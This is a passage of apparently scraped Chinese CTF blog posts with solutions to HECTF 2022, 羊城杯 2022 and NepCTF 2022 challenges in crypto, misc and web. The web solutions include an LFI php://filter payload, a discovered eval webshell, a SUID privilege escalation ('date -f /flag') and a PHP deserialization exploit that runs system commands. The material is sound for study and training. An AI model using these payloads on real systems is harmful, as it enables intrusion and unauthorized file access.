+= b&#x27; &#x27; return textdef pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)plain_text = b&#x27;???&#x27;enc_text = aes.encrypt(pad(plain_text))enc_text_b64=base64.b64encode(enc_text)print(enc_text_b64)#bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8= ECC+AES。 ECC满足 $P.\\text{order}()=p$，利用Smart’s Attack解 $k$： 123456789101112131415161718192021222324252627282930313233343536p = 235322474717419a = 0b = 8856682E = EllipticCurve(GF(p), [a, b])P = E(180571547161769,227820272156445)Q = E(76765539897460,69715189045993)def SmartAttack(P,Q,p): E = P.curve() Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ]) P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True) for P_Qp in P_Qps: if GF(p)(P_Qp.xy()[1]) == P.xy()[1]: break Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True) for Q_Qp in Q_Qps: if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]: break p_times_P = p*P_Qp p_times_Q = p*Q_Qp x_P,y_P = p_times_P.xy() x_Q,y_Q = p_times_Q.xy() phi_P = -(x_P/y_P) phi_Q = -(x_Q/y_Q) k = phi_Q/phi_P return ZZ(k)k = SmartAttack(P, Q, p)print(k)# 152675955744921 再代入还原AES解密即可： 123456789101112131415161718from Crypto.Cipher import AESimport base64aes_key = b&#x27;152675955744921&#x27;def pad_key(key): while len(key) % 16 != 0: key += b&#x27; &#x27; return keyaes = AES.new(pad_key(aes_key), AES.MODE_ECB)enc_text_b64 = &#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;enc_text = base64.b64decode(enc_text_b64)plain_text = aes.decrypt(enc_text)print(plain_text)# b&#x27;HECTF&#123;N0w_you_know_ecc_and_AES!&#125;&#x27; ​ xyz由于素数 $x \\in (2^{11},2^{12})$，爆破 $x$ ，再解关于 $y,z$ 的二元一次模方程组，根据式2将 $z$ 代入式1，得到关于 $y$ 的模方程，爆破求解 $m_1,m_2$，直到得到满足flag格式的值即解。 12345678910111213141516171819202122232425262728293031323334# Sageimport gmpy2p = 90269941327372741986138990624471228922188543388582792147052657918058877926048530226733915401487146960603412188605706389044850057749941283247036686933647699313789471852317821572828450212687824860596198164570332523289084374240518841959770316611451490236432102245045517406282462838053843074444594398723921432791a = 76528144673843458522824450076110371539627923753787397683655100259800630176098551106179842548579216667636910919853615859002981078385969868960955053568271518271225085057932965836858836455161323221071080085783042898199649213810735170960799816250402517689895712143360516054216300443029075429435539217594182165579b = 29135602763193779141406655503080226411846533327113770010672935904333289317045484412179311504151348405577659318044617676010167479271362994129802985294731037903701693595616818788260673254684442485084195062784616665615921849434909060917998818395292558822723253741815121539892159313890553027457549798418207587319s = []for i in range(10000): if i.bit_length()==12 and gmpy2.is_prime(i): s.append(i)print(len(s))ey = []for x in s: print(x) P.&lt;y&gt; = PolynomialRing(Zmod(p)) z = (b - x^12 - y^12)*inverse_mod(120*x,p) g = (12 * x + 12 * y + y * z + x * z ** 12) - a roots = g.monic().roots() if len(roots)&gt;0: for k in roots: ee = x yy = k[0] zz = (b - x^12 - yy^12)*inverse_mod(120*x,p)%p d = inverse_mod(ee, p-1) m1 = pow(yy, d, p) m2 = pow(zz, d, p) if &#x27;48454354467b&#x27; in hex(m1)[2:]: print(x) print(bytes.fromhex(hex(m1)[2:]+hex(m2)[2:])) break # 3989# HECTF&#123;46de31725b9a50b20e27cab2ddd5f5845cdd19066b4f97612&#125; ​ Misc咦~小鲨鱼来喽wireshark打开流量文件，逐个流查看，一眼找到flag。 ​ 来玩捉迷藏呀 你能寻找到真正的我吗？ png图片有lsb隐写，zsteg提取出内容： zsteg -E &quot;b1,rgb,lsb,xy&quot; 1010.png &gt; out1.txt， 得到16进制字符串转string，再xor 0x33发现zip压缩包头，提取出zip压缩包，解压得到flag.doc，将文字全选设置颜色，发现flag：HECTF&#123;hah0ha_Find-Me!!!&#125;。 ​ 你把我flag藏哪去了?flag.docx中打开隐藏文字，得到的base64解码得第一段字符串： kgkhlfloanaiufpghhalwujklkmownplkmwlygalpmfkgyggihuldlgaoyuloiggrplkvkgmrkaqzxemmiwklhugekleolpaaolffmaghmfgfmgvgjnblpmlajapufjlgplaojpjbffbjbwhuglggyjngmlbfygljbgxkixlmmqiksmpaqyojerafekadxdxxbarxlgngymsimhvuwkaexsglrapggkabmfulgvnmajufoekymalimxdijjpxyiagbpmkuallnlkpoeagfldlposkizvyxraazxrgxanoihqlxfogfgglpgjylkeakbylfvjomllkgjgymgfdlrpeqfklfslmejilpjiklpaapglxyevfkylfappbkdzflffllikqnialkbhjorndhsfomfaypghpqoxryimhfllfhlmkoreamroakgrljahmfailijanykfuaihfbzafaufmsffngfalmrbfflfaffwlnjmfgaaffauazjfijxiabfirmovpzekirbasfjsgzlukolyvohmvaalpkahsxfzammbfnmldzyaauifldvkmzbgfybaoffrflfoaadgmllnbgfpnrgxllyphyfnlexbvdnlokgoyilprflonshalkjaxngbjhlmbpdlamhkjfnlgmaagfjnjgkfrizlfflpmmglapxgmuninaaupkpfdigpsasmvkdjvgiyofdumpngpaljkjblfhahskiokpfgaayhnnfdsxkffqjaazvvdosefppfofigyamfnfngvlaoapdyixvbfdosobmlubaiugjxhfyfkvrakazgluyilpvgfwgynqggplbkwiiaxarlaflaalfkxfjlpegmmajngujlofuiffmvikfimraogqalalfmgubagfggoaakgrfqfhaemosraafyfopukudaalfggimhdfognhkrleflpalgalfapyjalgvoklgfllgaflaafafmazygpehfkzhlazngfmofliazlvnxanalugjlafovljfjubzgapehhfkfnfnggpalylivfegaaidrmyjagfalgmagflrklugadpffuaaky otherflag.txt中含有零宽字符，利用在线网站提取出第二段字符串： flpfypbgfeapwpsnlwklawllgryafjslgnbwapdfpzbpauanalfopwfpiabloaallziffklfggufrajpifgjfpakfmxpbsulvjsgmflgalagfnarslkbakuyfggagkfglnalduvqeayjgajmngeglnggxlngfmjmigkkiumlnfdwlkmaugngnvrrbfzxzyauauehofnemfmfffabbgvldlyhoaqjomfplapvhaaakogfirfvamkffygakampauuooolgpnnuelhffhvvisukwynmiglnllumhajekuguuplrxkiaeffllfkayrffggfffgyvpufvpbgagfaekipailovaffanuxsjgvjdqkvfuikflafmdkbbnkpgfxrqpfglavgslujjlffulhugzliumaadngwihmmojfbhxvomafpbfhaviwlguefogppmjsplglfhlgrklbisphajpgnhlispnaskklljggklzaffhnelnfyrymgaghfifojmjjsekoomffffuaawbdgaqrmgzprvgwzjxefhjadkikurllllljoghmlwfflfmlovfplnaqpeozloadkeiolfklivuylzbjooxlsglngduvxanahjgepgu&#125;klghplmvzilkpggpholgiogjavpagjhdonunlpgolndqbqfdmbpjjoxbomlikyuipnxqxzlifforghheuyyazhjuagfwaulrjlfxoiggyjfbfpjigkgyafplfpqwadiqniavvgufjdjlifjiorymvfxmxgorilyldfhofbbygflgairjdidgdqvikjoliyfdzhfrognyyibkgnnvhmjlolfgvwfijlggfkpakpgflfydvfwydofkhgiygwllwljogrqvzjlffgllallblpkfbsflhrajdgowprdblubflyoybhvhwfwoeiagnxbzniffpllxmfknuihfobfeefkkgkynnglkkldugmgsvnphlafgsrnroehvffwapnfjfpglrkpafhlsjgriplrfldglznhonfdlohosfhohegknaiamjflnboplllxluigoxlkrbglrgebaggriaefmzlqidofgafqgbgdilnmhoaionobfynlgozadgvvimxoboaikkfxwirorpflluzhophfdliekljyomejklgffjnunh&#123;opgdafgamla 看字符串无规律，猜测为字符频率统计，找一个在线工具统计字符出现次数，按结果从大到小排序取出对应字符为 flagkpomijnhuybrvdxezswq&#123;&#125;，调整括号位置即为flag：flag&#123;kpomijnhuybrvdxezswq&#125;。 ​ 我的手要不行辣图片内文字用在线OCR识别转文字，hex转字符，根据文件头转存为zip压缩包，使用ARCHPR爆破出密码8686，解压得到txt内为音符加密，使用在线解密工具解密得到flag：flag&#123;y0u_fi0d_m2_f1ag&#125;。 ​ 2022HECTF调查问卷写问卷得flag。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2022年羊城杯网络安全大赛","slug":"match-2022年羊城杯网络安全大赛","date":"2022-09-04T05:46:20.000Z","updated":"2022-09-04T13:50:35.327Z","comments":true,"path":"2022/09/04/match-2022年羊城杯网络安全大赛/","permalink":"https://lazzzaro.github.io/2022/09/04/match-2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ 大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、杭州安恒信息技术股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。 大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。 本届大赛由【广外女生战队】与杭州安恒信息技术股份有限公司共同命题，采用CTF（夺旗赛）团队竞赛模式，参赛队伍通过互联网在线解题，题目类型涉及Web安全、逆向工程 (Reverse)、二进制漏洞挖掘和利用（Pwn）、密码学（Crypto）、杂项（Misc）等类别。 比赛时间：9月3日 9:00 - 9月4日 9:00 WEBrce_me 简单web 1234567891011121314151617&lt;?php(empty($_GET[&quot;file&quot;])) ? highlight_file(__FILE__) : $file=$_GET[&quot;file&quot;];function fliter($var): bool&#123; $blacklist = [&quot;&lt;&quot;,&quot;?&quot;,&quot;$&quot;,&quot;[&quot;,&quot;]&quot;,&quot;;&quot;,&quot;eval&quot;,&quot;&gt;&quot;,&quot;@&quot;,&quot;_&quot;,&quot;create&quot;,&quot;install&quot;,&quot;pear&quot;]; foreach($blacklist as $blackword)&#123; if(stristr($var, $blackword)) return False; &#125; return True;&#125; if(fliter($_SERVER[&quot;QUERY_STRING&quot;]))&#123;include $file;&#125;else&#123;die(&quot;Noooo0&quot;);&#125; 非预期。Dirsearch扫一下发现他人上传的shell.php，利用file参数include+伪协议包含一下： ?file=php://filter/read=convert.base64-encode/resource=shell.php base64解码得到源码：&lt;?php @eval($_POST[a]);?&gt; 用蚁剑连接上，在根目录下发现flag，但是权限不够无法查看。 find / -user root -perm -4000 -print 2&gt;/dev/null 查看具有SUID权限的可执行文件，发现date命令可用，提权： date -f /flag 在报错文字中获取flag内容。 ​ Safepop Wake up!Pop corn is not safe food, 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(E_ALL);ini_set(&#x27;display_errors&#x27;, true);highlight_file(__FILE__);class Fun&#123; private $func = &#x27;call_user_func_array&#x27;; public function __call($f,$p)&#123; call_user_func($this-&gt;func,$f,$p); &#125; public function __wakeup()&#123; $this-&gt;func = &#x27;&#x27;; die(&quot;Don&#x27;t serialize me&quot;); &#125;&#125;class Test&#123; public function getFlag()&#123; system(&quot;cat /flag?&quot;); &#125; public function __call($f,$p)&#123; phpinfo(); &#125; public function __wakeup()&#123; echo &quot;serialize me?&quot;; &#125;&#125;class A&#123; public $a; public function __get($p)&#123; if(preg_match(&quot;/Test/&quot;,get_class($this-&gt;a)))&#123; return &quot;No test in Prod\\n&quot;; &#125; return $this-&gt;a-&gt;$p(); &#125;&#125;class B&#123; public $p; public function __destruct()&#123; $p = $this-&gt;p; echo $this-&gt;a-&gt;$p; &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; $pop = $_GET[&#x27;pop&#x27;]; $o = unserialize($pop); throw new Exception(&quot;no pop&quot;);&#125; 找反序列化pop链： Test/getFlag() &lt;- A/__get($p) &lt;- B/__destruct() 由于类A存在过滤 preg_match(&quot;/Test/&quot;,get_class($this-&gt;a))，类A不能调类Test，利用上类Fun： Fun/__call($f,$p) &lt;- A/__get($p) &lt;- B/__destruct() 编写脚本： 1234567891011121314151617181920from phpserialize import serializefrom urllib.parse import * class Test: pass class Fun: private_func = &#x27;system&#x27; class A: public_a = Fun() class B: # public_p = &#x27;ls /&#x27; public_p = &#x27;cat /flag?&#x27; public_a = A() print(quote(serialize(B())))# O%3A1%3A%22B%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D 由于类Fun有 __wakeup() 会清空 private $func，修改数字绕过 __wakeup()： O%3A1%3A%22B%22%3A3%3A%7Bs%3A1%3A%22a%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22Fun%22%3A1%3A%7Bs%3A9%3A%22%00Fun%00func%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A1%3A%22p%22%3Bs%3A10%3A%22cat%20/flag%3F%22%3B%7D 传入pop参数得到flag。 ​ MISCwhere_is_secret easy_misc 一个vig.txt和一个zip压缩包，txt中文字 Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo 使用在线维吉尼亚密码解密网站解出明文： Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds 用密码 GWHT@R1nd0yyds 解压zip，得到一张bmp图，根据比赛中期放的hint提示加密脚本： 12345678910111213141516171819202122232425262728from PIL import Imageimport mathdef encode(text): str_len = len(text) width = math.ceil(str_len ** 0.5) im = Image.new(&quot;RGB&quot;, (width, width), 0x0) x, y = 0, 0 for i in text: index = ord(i) rgb = (0, (index &amp; 0xFF00) &gt;&gt; 8, index &amp; 0xFF) im.putpixel((x, y), rgb) if x == width - 1: x = 0 y += 1 else: x += 1 return imif __name__ == &#x27;__main__&#x27;: with open(&quot;829962.txt&quot;, encoding=&quot;gbk&quot;) as f: all_text = f.read() im = encode(all_text) im.save(&quot;out.bmp&quot;) 通过爆破方法逆回原文本即可，发现原文为一本书，包含大量中文，还原时设置不输出中文，缩短运行时间： 123456789101112131415161718192021222324252627from PIL import Imageimg = Image.open(r&#x27;out.bmp&#x27;)width, height = img.sizetext=&#x27;&#x27;x, y = 0, 0for i in range(200000): try: r,g,b = img.getpixel((x,y)) for j in range(126): if ((j &amp; 0xFF00) &gt;&gt; 8) == g and j &amp; 0xFF == b: text+=chr(j) break else: pass if x == width - 1: x = 0 y += 1 else: x += 1 except: breakprint(x,y)open(r&#x27;text.txt&#x27;,&#x27;w&#x27;).write(text) 在得到的字符里，找到flag格式的且带有意义的字符，组成flag：flag&#123;h1d3_1n_th3_p1ctur3&#125;。 ​ 迷失幻境 走不出自责空间，沉溺于我们昨天，还能不能相见。 用DiskGenius打开vmdk文件，在回收站发现一张可莉jpg图片和一张无文件类型后缀的幻境png图片，提取出来。 在“迷失幻境”夹子里有1张可莉jpg图片和100张一样的幻境png图片，前后相同图片的大小不同，尝试盲水印提取信息不成功，再尝试将幻境png大图与小图进行减（sub）操作，得到 key为 可莉前来报道。 回收站里可莉jpg图片存在备注信息 猜不到，怎么想都猜不到吧。，用outguess提取： outguess -r keli.jpg -k &quot;可莉前来报道&quot; -t out.txt 得到flag：DASCTF&#123;f473a6fd2de17a0c5794414b3905ebbe&#125;。 ​ 签个到 签个到，请注意，本次比赛所有 flag 提交时都只需要提交括号内的字符串，比如这个题的 flag 如果是 flag{xxx}, 您只需要提交 xxx 即可得分。 ZMJTPM33TIGQTLMDTV4JXLYQTNMQTAOLTSGTRMOLZD2JPMOETIEQBZ3PTZ2U2===，初看为base32，解码为乱码。 flag&#123; 对应base32编码为 MZWGCZ33，故为rot13+base32，解码得 flag&#123;5f3c029eac023481fbd8d5ad15b73b34&#125;。 ​ CRYPTOLRSA RSA and some other things 1234567891011121314151617181920212223242526from Crypto.Util.number import *import gmpy2from flag import flagm=bytes_to_long(flag)def getPQ(p,q): P=getPrime(2048) Q=getPrime(2048) t=(p*P-58*P+q)%Q assert (isPrime(Q)) return P,Q,tB=getRandomNBitInteger(11)p=getPrime(B)q=getPrime(B)n=p*qe=65537c=pow(m,e,n)P,Q,t=getPQ(p,q)print(&quot;B=&quot;,B)print(&quot;P*P*Q=&quot;,P*P*Q)print(&quot;P*Q*Q=&quot;,P*Q*Q)print(&quot;t=&quot;,t)print(&quot;c=&quot;,c) $\\gcd(P \\cdot P \\cdot Q,P \\cdot Q \\cdot Q)=P \\cdot Q$，继而求得 $P$ 和 $Q$，又有 $t=(P \\cdot(p-58)+q) \\bmod Q$，构造格 $\\begin{bmatrix} 1 &amp; P \\newline 0 &amp; Q \\end{bmatrix}$，利用LLL算法规约得到 $p-58$ 和 $q$ 值。 123456789101112131415161718192021222324B = 1023PPQ = 17550772391048142376662352375650397168226219900284185133945819378595084615279414529115194246625188015626268312188291451580718399491413731583962229337205180301248556893326419027312533686033888462669675100382278716791450615542537581657011200868911872550652311318486382920999726120813916439522474691195194557657267042628374572411645371485995174777885120394234154274071083542059010253657420242098856699109476857347677270860654429688935924519805555787949683144015873225388396740487817155358042797286990338440987035608851331840925854381286767024584195081004360635842976624747610461507795755042915965483135990495921912997789567020652729777216671481467049291624343256152446367091568361258918212012737611001009003078023715854575413979603297947011959023398306612437250872299406744778763429172689675430968886613391356192380152315042387148665654062576525633130546454743040442444227245763939134967515614637300940642555367668537324892890004459521919887178391559206373513466653484926149453481758790663522317898916616435463486824881406198956479504970446076256447830689197409184703931842169195650953917594642601134810084247402051464584676932882503143409428970896718980446185114397748313655630266379123438583315809104543663538494519415242569480492899140190587129956835218417371308642212037424611690324353109931657289337536406499314388951678319136343913551598851601805737870217800009086551022197432448461112330252097447894028786035069710260561955740514091976513928307284531381150606428802334767412638213776730300093872457594524254858721551285338651364457529927871215183857169772407595348187949014442596356406144157105062291018215254440382214000573515515859668018846789551567310531570458316720877172632139481792680258388798439064221051325274383331521717987420093245521230610073103811158660291643007279940393509663374960353315388446956868294358252276964954745551655711981PQQ = 17632503734712698604217167790453868045296303200715867263641257955056721075502316035280716025016839471684329988600978978424661087892466132185482035374940487837109552684763339574491378951189521258328752145077889261805000262141719400516584216130899437363088936913664419705248701787497332582188063869114908628807937049986360525010012039863210179017248132893824655341728382780250878156526086594253092249935304259986328308203344932540888448163430113818706295806406535364433801544858874357459282988110371175948011077595778123265914357153104206808258347815853145593128831233094769191889153762451880396333921190835200889266000562699392602082643298040136498839726733129090381507278582253125509943696419087708429546384313035073010683709744463087794325058122495375333875728593383803489271258323466068830034394348582326189840226236821974979834541554188673335151333713605570214286605391522582123096490317734786072061052604324131559447145448500381240146742679889154145555389449773359530020107821711994953950072547113428811855524572017820861579995449831880269151834230607863568992929328355995768974532894288752369127771516710199600449849031992434777962666440682129817924824151147427747882725858977273856311911431085373396551436319200582072164015150896425482384248479071434032953021738952688256364397405939276917210952583838731888536160866721278250628482428975748118973182256529453045184370543766401320261730361611365906347736001225775255350554164449014831203472238042057456969218316231699556466298168668958678855382462970622819417830000343573014265235688391542452769592096406400900187933156352226983897249981036555748543606676736274049188713348408983072484516372145496924391146241282884948724825393087105077360952770212959517318021248639012476095670769959011548699960423508352158455979906789927951812368185987838359200354730654103428077770839008773864604836807261909t = 44c = 4364802217291010807437827526073499188746160856656033054696031258814848127341094853323797303333741617649819892633013549917144139975939225893749114460910089509552261297408649636515368831194227006310835137628421405558641056278574098849091436284763725120659865442243245486345692476515256604820175726649516152356765363753262839864657243662645981385763738120585801720865252694204286145009527172990713740098977714337038793323846801300955225503801654258983911473974238212956519721447805792992654110642511482243273775873164502478594971816554268730722314333969932527553109979814408613177186842539860073028659812891580301154746e = 65537PQ = gcd(PPQ,PQQ)P = PPQ//PQQ = PQQ//PQprint(P)print(Q)A = Matrix(ZZ,[[1,P],[0,Q]])x = A.LLL()[0][0]p = -x+58q = (t-P*(p-58))%Qf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,p*q)print(bytes.fromhex(hex(m)[2:]))# b&#x27;DASCTF&#123;8f3djoj9wedj2_dkc903cwckckdk&#125;&#x27; ​ EasyRsa really easy rsa 1234567891011121314151617from flag import flagfrom Crypto.Util.number import *m = bytes_to_long(flag)e = 65537f = open(&quot;output.txt&quot;, &quot;r&quot;)a = f.readlines()for i in a: n = int(i) c = pow(m, e, n) m = cprint &#x27;c = %s&#x27; % (m)f.close()&#x27;&#x27;&#x27;c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727&#x27;&#x27;&#x27; gcd测试发现output中的 $n$ 有素公因子 $p$，逆推还原 $m$ 即可： 1234567891011121314n = [65439077968397540989065489337415940784529269429684649365065378651353483030304843439003949649543376311871845618819107350646437252980144978447924976470943930075812834237368425374578215977641265884859875440799334807607478705932175148673160353577875890074101393042506714001617338265284910381849259298772642190619,86843235426823545017422014398916780909062053456790256392304973548517489132984667679637386416948409930796162377844525829968317585749956057149930523547463230147376192820753802868362225137830225967953826475779047454555958271846035526319036389127587352017149417549187850782892924691511398536178090031958365483499,57839320383142814687522363258949714784622321678585619281948174372461045134361003939684803510572969567182690634502610963365500727981041136988638273942465134797850643121827808482673619534240872593224537996099454035648829692386918230535360101064254854063175494150147494342652670585674593236663514793256521719547,52668168898129361356420333177679019946307853075463961068071790653159090226904625885080236174231665178538405547828768043706515464922611051221394704678558922339886480247663138702481349098077291584992082414494275463670330534613607852999291645500391111597009868188974671249118213040057429113174377610094956993269,79875848044631194160351918105738804229446748736206976033243436373010695259945613104837645712048695514204494137005015770637421510392760763371639480133851920449252506525423837434811693638210458851990502785655738042348115385964604080872180121543147063180945532713593712726527002909054818485584237993215139630243,73100501797447180147684637554796375398455002202770022931512541062214916136294604754404667725341796896161398464327153718845280194035978972665664657052946003418121755545770123205426883869361411412259838522099085901563107814985172942977520233320215882707710717870398128412272218474014381169303848087621856187879,89149546555397759430343098936690138982544367561661914051499112345535238108800665531588376806546499374457634397161670140520060064963391826220177798442707381640723248034061313974522233415815795656570220902974484865176728535660627712374835329967608728216749734529761431592345816592875807318876347151421393671763,66449107450661172442868032153863675098235855689218695279414435182923510356012957155941548483160873271040452368644926703812707864779900715051152673705082002761445847561495295455460041902473282731259268870375921215589157288622757488879539441498396276257589120302991242300378364101246448094955634459779361686643,79694880331320743031437708811856697413105291652061062223857313580221562305807771003185061831752133665835648647560103986928466217390444724672894866216636981793418219455653595717274553950715056120806463449033181486699963584346517910081706586345546292894426402568226579894766693070066214488743160957135286739213,70521001788476157145543175674209083194325853388116385624440232036679708917857095748070597575068955423165296665429648694541353249787337464272095260410717659726012806836884799476995758902361678737968193674368688353935424186389207123637734230550266810766585903134004322848985320790788169777840924595645463787189,51801430118171456966246071852561156183140136541960623661080056673664466785669585092926482194691254461430866302262960624015915371927788809661387318097968209364907625599562339722700041444342116899266802018340155635959614677597708758012024981583143521259152639480003228924151971208695043251548758407218187895663,87310111118839703578797261862424304499548882114635944516216618095145194843718635007052242072452831460162126955481326379219639313067967998826898344673513019946299427614605216960081461930080199023399060417820769438661351988322185620598552697590115678078498754112860310272842870106790357443602405008865116282919]e = 65537p = 7552850543392291177573335134779451826968284497191536051874894984844023350777357739533061306212635723884437778881981836095720474943879388731913801454095897c = 38127524839835864306737280818907796566475979451567460500065967565655632622992572530918601432256137666695102199970580936307755091109351218835095309766358063857260088937006810056236871014903809290530667071255731805071115169201705265663551734892827553733293929057918850738362888383312352624299108382366714432727for i in range(len(n)-1,-1,-1): q = int(n[i]//p) f = (p-1)*(q-1) d = inverse_mod(e,f) c = int(pow(c,d,n[i])) print(bytes.fromhex(hex(c)[2:]))# b&#x27;GWHT&#123;gixkJl7SJTcpLOL9zqwo&#125;&#x27; ​ Solomen’s puzzle 1 F1ower做梦梦见了Reed和Solomen，他们告诉了F1ower财富密码，但是F1ower记错了几个字节。。请将最终得到的完整flag(包含DASCTF{})进行MD5后再提交，即提交：`”DASCTF","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NepCTF 2022","slug":"match-NepCTF-2022","date":"2022-07-17T13:18:30.000Z","updated":"2022-07-17T16:14:32.991Z","comments":true,"path":"2022/07/17/match-NepCTF-2022/","permalink":"https://lazzzaro.github.io/2022/07/17/match-NepCTF-2022/","excerpt":"","text":"​ “NepCTF 2022”是由Nepnep联合站队主办的公益招新赛事，旨在以有代表性、有特色的题目培养新生网络安全能力。 比赛时间：2022年7月15日10:00 - 2022年7月17日10:00。 比赛形式：个人解题赛 比赛链接：http://nep.lemonprefect.cn/ 比赛平台：Power by CTFm NepCTF 2022赛事说明文档：https://www.wolai.com/nepnep/4c2ZG1UaTnVMmyYsKB5duj Rank: 4 MISC签到题 极限套娃 flag格式为nepctf{} jpg中提取出zip压缩包，zip压缩包套娃232层，用cyberchef label+jump循环提取出最内层的pcap文件； wireshark打开发现为USB键盘流量，tshark工具提取出usb.capdata数据，用脚本还原键位： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465normalKeys = &#123; &quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;, &quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;, &quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;, &quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;, &quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;, &quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;, &quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123; &quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, 